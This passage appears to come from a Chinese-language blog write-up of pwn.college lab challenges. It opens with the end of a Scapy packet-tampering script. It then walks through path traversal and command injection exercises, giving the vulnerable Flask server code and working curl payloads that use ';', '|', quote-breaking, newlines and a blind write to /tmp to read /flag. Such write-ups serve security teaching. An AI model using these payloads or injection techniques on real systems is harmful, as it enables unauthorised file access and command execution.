new_packet[IP].chksum = <span class="literal">None</span></span><br><span class="line">            new_packet[TCP].chksum = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 发送修改后的数据包</span></span><br><span class="line">            send(new_packet)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 修改后的数据包已发送&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 这里可以选择丢弃原来的数据包，阻止原包继续发送</span></span><br><span class="line">            <span class="keyword">return</span>  <span class="comment"># 拦截原数据包，不再发送原始的 ECHO 包</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 捕获并处理TCP流量</span></span><br><span class="line">sniff(iface=<span class="string">&quot;eth0&quot;</span>, prn=packet_callback, <span class="built_in">filter</span>=<span class="string">&quot;tcp&quot;</span>, store=<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="3-Web-Security"><a href="#3-Web-Security" class="headerlink" title="3 Web Security"></a>3 Web Security</h2><h3 id="3-1-PATH-Traversal-1"><a href="#3-1-PATH-Traversal-1" class="headerlink" title="3.1 PATH Traversal 1"></a>3.1 PATH Traversal 1</h3><p>通过<code>/challenge/server</code>启动服务器后会有一个网页，同时可以通过 <code>ls /</code>命令看见在目录<code>/</code>下的<code>flag</code>文件夹。最后通过 URL 编码的路径遍历：<code>curl -v http://challenge.localhost:80/%2e%2e/%2e%2e/flag</code>获得<code>flag</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">path=<span class="string">&quot;index.html&quot;</span></span>):</span><br><span class="line">    requested_path = app.root_path + <span class="string">&quot;/files/&quot;</span> + path</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;requested_path=&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(requested_path).read()</span><br><span class="line">    <span class="keyword">except</span> PermissionError:</span><br><span class="line">        flask.abort(<span class="number">403</span>, requested_path)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        flask.abort(<span class="number">404</span>, <span class="string">f&quot;No <span class="subst">&#123;requested_path&#125;</span> from directory <span class="subst">&#123;os.getcwd()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        flask.abort(<span class="number">500</span>, requested_path + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure>

<ol>
<li>这段代码定义了一个 Flask Web 服务器，用于从 <code>/files</code> 目录中返回请求的文件内容。</li>
<li>它通过路径拼接处理用户提供的文件路径，并且捕捉可能出现的文件读取错误（如权限问题、文件不存在等）。</li>
<li>如果请求的文件存在且可以读取，服务器会将文件内容返回给客户端。如果发生错误，服务器会返回相应的 HTTP 错误码。</li>
<li>最后，代码配置了 Flask 服务器的密钥、端口和服务器名称，并启动了服务器。</li>
</ol>
<h3 id="3-2-Path-Traversal-2"><a href="#3-2-Path-Traversal-2" class="headerlink" title="3.2 Path Traversal 2"></a>3.2 Path Traversal 2</h3><p>这里的<code>path.strip(&quot;/.&quot;)</code>会将<code>curl -v http://challenge.localhost:80/fortunes/%2e%2e/%2e%2e/flag</code> 中传入的<code>path</code>的前后的以<code>.</code>和<code>/</code>开头和结尾的符号去掉，所以需要通过<code>fortunes</code>绕过，也即<code>curl -v http://challenge.localhost:80/fortunes/%2e%2e/%2e%2e/%2e%2e/flag</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">path=<span class="string">&quot;index.html&quot;</span></span>):</span><br><span class="line">    requested_path = app.root_path + <span class="string">&quot;/files/&quot;</span> + path.strip(<span class="string">&quot;/.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;requested_path=&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(requested_path).read()</span><br><span class="line">    <span class="keyword">except</span> PermissionError:</span><br><span class="line">        flask.abort(<span class="number">403</span>, requested_path)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        flask.abort(<span class="number">404</span>, <span class="string">f&quot;No <span class="subst">&#123;requested_path&#125;</span> from directory <span class="subst">&#123;os.getcwd()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        flask.abort(<span class="number">500</span>, requested_path + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-3-CMDi-1"><a href="#3-3-CMDi-1" class="headerlink" title="3.3 CMDi 1"></a>3.3 CMDi 1</h3><p>这是server的源码，我们可以在请求中嵌入一个随便的<code>direction</code>，然后再加一个<code>；</code>和<code>\space</code>就可以直接访问到<code>/flag</code>了，注意：需要对特殊字符进行 URL 编码。<code>curl &quot;http://challenge.localhost:80/?directory=/your/directory/path%3Bcat%20/flag&quot;</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    directory = flask.request.args.get(<span class="string">&quot;directory&quot;</span>, <span class="string">&quot;/challenge&quot;</span>)</span><br><span class="line">    command = <span class="string">f&quot;ls -l <span class="subst">&#123;directory&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;command=&#125;</span>&quot;</span>)</span><br><span class="line">    listing = subprocess.run(</span><br><span class="line">        command,                    <span class="comment"># the command to run</span></span><br><span class="line">        shell=<span class="literal">True</span>,                 <span class="comment"># use the shell to run this command</span></span><br><span class="line">        stdout=subprocess.PIPE,     <span class="comment"># capture the standard output</span></span><br><span class="line">        stderr=subprocess.STDOUT,   <span class="comment"># 2&gt;&amp;1</span></span><br><span class="line">        encoding=<span class="string">&quot;latin&quot;</span>            <span class="comment"># capture the resulting output as text</span></span><br><span class="line">    ).stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        Welcome to the dirlister service! Please choose a directory to list the files of:</span></span><br><span class="line"><span class="string">        &lt;form&gt;&lt;input type=text name=directory&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Output of: ls -l <span class="subst">&#123;directory&#125;</span>&lt;/b&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;pre&gt;<span class="subst">&#123;listing&#125;</span>&lt;/pre&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.setuid(os.geteuid())</span><br><span class="line">os.environ[<span class="string">&quot;PATH&quot;</span>] = <span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure>

<h3 id="3-4-CMDi-2"><a href="#3-4-CMDi-2" class="headerlink" title="3.4 CMDi 2"></a>3.4 CMDi 2</h3><p>源码中可以看见<code> directory = flask.request.args.get(&quot;directory&quot;, &quot;/challenge&quot;).replace(&quot;;&quot;, &quot;&quot;)</code>这里的<code>;</code>被替换了，所以我们无法向3.3一样通过；执行注入，但是我们仍然可以通过管道的方式注入命令，也即，<code>http://challenge.localhost:80/?directory=/|%20cat%20/flag</code>其中<code>%20</code>是空格的URL编码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    directory = flask.request.args.get(<span class="string">&quot;directory&quot;</span>, <span class="string">&quot;/challenge&quot;</span>).replace(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    command = <span class="string">f&quot;ls -l <span class="subst">&#123;directory&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;command=&#125;</span>&quot;</span>)</span><br><span class="line">    listing = subprocess.run(</span><br><span class="line">        command,                    <span class="comment"># the command to run</span></span><br><span class="line">        shell=<span class="literal">True</span>,                 <span class="comment"># use the shell to run this command</span></span><br><span class="line">        stdout=subprocess.PIPE,     <span class="comment"># capture the standard output</span></span><br><span class="line">        stderr=subprocess.STDOUT,   <span class="comment"># 2&gt;&amp;1</span></span><br><span class="line">        encoding=<span class="string">&quot;latin&quot;</span>            <span class="comment"># capture the resulting output as text</span></span><br><span class="line">    ).stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        Welcome to the dirlister service! Please choose a directory to list the files of:</span></span><br><span class="line"><span class="string">        &lt;form&gt;&lt;input type=text name=directory&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Output of: ls -l <span class="subst">&#123;directory&#125;</span>&lt;/b&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;pre&gt;<span class="subst">&#123;listing&#125;</span>&lt;/pre&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.setuid(os.geteuid())</span><br><span class="line">os.environ[<span class="string">&quot;PATH&quot;</span>] = <span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure>

<h3 id="3-5-CMDi-3"><a href="#3-5-CMDi-3" class="headerlink" title="3.5 CMDi 3"></a>3.5 CMDi 3</h3><p>这里的command 使用了单引号将directory括了起来，我们在尝试注入指令的时候首先注入一个单引号将前面的单引号匹配上，然后再注入真正的命令，最后再用一个单引号批评后面的单引号。也即<code> curl &quot;http://challenge.localhost:80/?directory=&#39;%3B%20cat%20/flag&#39;&quot;</code>等价于<code>echo Hello &#39;&#39;; cat /flag; echo &#39;&#39;</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    directory = flask.request.args.get(<span class="string">&quot;directory&quot;</span>, <span class="string">&quot;/challenge&quot;</span>)</span><br><span class="line">    command = <span class="string">f&quot;ls -l &#x27;<span class="subst">&#123;directory&#125;</span>&#x27;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;command=&#125;</span>&quot;</span>)</span><br><span class="line">    listing = subprocess.run(</span><br><span class="line">        command,                    <span class="comment"># the command to run</span></span><br><span class="line">        shell=<span class="literal">True</span>,                 <span class="comment"># use the shell to run this command</span></span><br><span class="line">        stdout=subprocess.PIPE,     <span class="comment"># capture the standard output</span></span><br><span class="line">        stderr=subprocess.STDOUT,   <span class="comment"># 2&gt;&amp;1</span></span><br><span class="line">        encoding=<span class="string">&quot;latin&quot;</span>            <span class="comment"># capture the resulting output as text</span></span><br><span class="line">    ).stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        Welcome to the dirlister service! Please choose a directory to list the files of:</span></span><br><span class="line"><span class="string">        &lt;form&gt;&lt;input type=text name=directory&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Output of: ls -l &#x27;<span class="subst">&#123;directory&#125;</span>&#x27;&lt;/b&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;pre&gt;<span class="subst">&#123;listing&#125;</span>&lt;/pre&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.setuid(os.geteuid())</span><br><span class="line">os.environ[<span class="string">&quot;PATH&quot;</span>] = <span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure>

<h3 id="3-6-CMDi-4"><a href="#3-6-CMDi-4" class="headerlink" title="3.6 CMDi 4"></a>3.6 CMDi 4</h3><p>这个也是一样，将注入的命令替换到timezone中，也即运行<code>curl &quot;http://challenge.localhost:80/?timezone=MST;cat%20/flag&quot;</code>这个代码将命令从中间分开，然后运行<code>cat /flag</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    timezone = flask.request.args.get(<span class="string">&quot;timezone&quot;</span>, <span class="string">&quot;MST&quot;</span>)</span><br><span class="line">    command = <span class="string">f&quot;TZ=<span class="subst">&#123;timezone&#125;</span> date&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;command=&#125;</span>&quot;</span>)</span><br><span class="line">    result = subprocess.run(</span><br><span class="line">        command,                    <span class="comment"># the command to run</span></span><br><span class="line">        shell=<span class="literal">True</span>,                 <span class="comment"># use the shell to run this command</span></span><br><span class="line">        stdout=subprocess.PIPE,     <span class="comment"># capture the standard output</span></span><br><span class="line">        stderr=subprocess.STDOUT,   <span class="comment"># 2&gt;&amp;1</span></span><br><span class="line">        encoding=<span class="string">&quot;latin&quot;</span>            <span class="comment"># capture the resulting output as text</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        Welcome to the timezone service! Please choose a timezone to get the time there.</span></span><br><span class="line"><span class="string">        &lt;form&gt;&lt;input type=text name=timezone&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Output of: TZ=<span class="subst">&#123;timezone&#125;</span> date&lt;/b&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;pre&gt;<span class="subst">&#123;result.stdout&#125;</span>&lt;/pre&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.setuid(os.geteuid())</span><br><span class="line">os.environ[<span class="string">&quot;PATH&quot;</span>] = <span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure>

<h3 id="3-7-CMDi-5"><a href="#3-7-CMDi-5" class="headerlink" title="3.7 CMDi 5"></a>3.7 CMDi 5</h3><p>观察服务器源码和提示可以知道，这个关卡是基于“盲注”（blind injection），也就是说你无法直接看到命令执行的输出。所以我们需要通过命令<code>curl &quot;http://challenge.localhost:80/?filepath=/flag;cat%20/flag%20&gt;%20/tmp/flag_output&quot;</code>创建一个<code>flag_output</code>，然后再去访问它<code>curl &quot;http://challenge.localhost:80/?filepath=/tmp/flag_output&quot;</code>或者<code>cat /tmp/flag_output</code>这两个命令都可以。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/opt/pwn.college/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    filepath = flask.request.args.get(<span class="string">&quot;filepath&quot;</span>, <span class="string">&quot;/challenge&quot;</span>)</span><br><span class="line">    command = <span class="string">f&quot;touch <span class="subst">&#123;filepath&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;DEBUG: <span class="subst">&#123;command=&#125;</span>&quot;</span>)</span><br><span class="line">    subprocess.run(</span><br><span class="line">        command,                    <span class="comment"># the command to run</span></span><br><span class="line">        shell=<span class="literal">True</span>,                 <span class="comment"># use the shell to run this command</span></span><br><span class="line">        stdout=subprocess.PIPE,     <span class="comment"># capture the standard output</span></span><br><span class="line">        stderr=subprocess.STDOUT,   <span class="comment"># 2&gt;&amp;1</span></span><br><span class="line">        encoding=<span class="string">&quot;latin&quot;</span>            <span class="comment"># capture the resulting output as text</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        Welcome to the touch service! Please choose a file to touch:</span></span><br><span class="line"><span class="string">        &lt;form&gt;&lt;input type=text name=filepath&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;Ran the command: touch <span class="subst">&#123;filepath&#125;</span>&lt;/b&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">os.setuid(os.geteuid())</span><br><span class="line">os.environ[<span class="string">&quot;PATH&quot;</span>] = <span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">8</span>)</span><br><span class="line">port = <span class="number">8080</span> <span class="keyword">if</span> os.geteuid() <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line">app.config[<span class="string">&#x27;SERVER_NAME&#x27;</span>] = <span class="string">f&quot;challenge.localhost:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">app.run(<span class="string">&quot;challenge.localhost&quot;</span>, port)</span><br></pre></td></tr></table></figure>

<h3 id="3-8-CMDi-6"><a href="#3-8-CMDi-6" class="headerlink" title="3.8 CMDi 6"></a>3.8 CMDi 6</h3><blockquote>
<p>有时，开发者会非常努力地过滤掉潜在的危险字符。在这个挑战中，他们的过滤几乎是完美的，但还差一点点……你可能会被困住一会儿，但当你弄明白解决方案时，你会因为它的熟悉感而笑出来！</p>
</blockquote>
<p>这个虽然过滤了这么多符号，但是其实换行符就可以绕过了:<code>curl &quot;http://challenge.localhost:80/?directory=%0Acat%20/flag&quot;</code>，实际命令为，注意这里是有换行符号的。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l </span><br><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure>



